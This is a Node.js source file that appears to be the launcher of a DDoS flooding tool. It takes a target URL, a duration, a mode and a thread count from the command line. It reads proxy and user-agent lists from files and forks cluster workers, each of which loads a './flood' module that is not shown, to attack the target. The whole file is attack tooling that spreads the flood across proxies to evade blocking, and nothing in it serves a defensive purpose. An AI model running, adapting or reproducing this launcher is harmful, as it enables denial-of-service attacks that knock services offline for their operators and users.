const net = require('net'),
events = require('events'),
cluster = require('cluster'),
fs = require('fs'),
threads = process.argv[5];
process.setMaxListeners(0); 
events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;
var log = console.log;


global.logger = function() { 
    var first_parameter = arguments[0];
    var other_parameters = Array.prototype.slice.call(arguments, 1);

    function formatConsoleDate(date) {
        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        var milliseconds = date.getMilliseconds();

        return '[' +
            ((hour < 10) ? '0' + hour : hour) +
            ':' +
            ((minutes < 10) ? '0' + minutes : minutes) +
            ':' +
            ((seconds < 10) ? '0' + seconds : seconds) +
            '.' +
            ('00' + milliseconds).slice(-3) +
            '] ';
    }

    log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));
};

if (cluster.isMaster) {
    let proxies = [...new Set(fs.readFileSync('proxies.txt').toString().match(/\S+/g))],
        dproxies = proxies;
    proxies = [];

    for (let i = 0; i < threads; i++) {
        cluster.fork().setMaxListeners(0).send({
            target: process.argv[2],
            proxies: dproxies,
            userAgents: [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
            referers: [],		
            duration: process.argv[3] * 1e3 * threads,
            opt: {
                ratelimit: false
            },
            mode: process.argv[4]	    
	});
    }
} else {
    require('./flood');
}
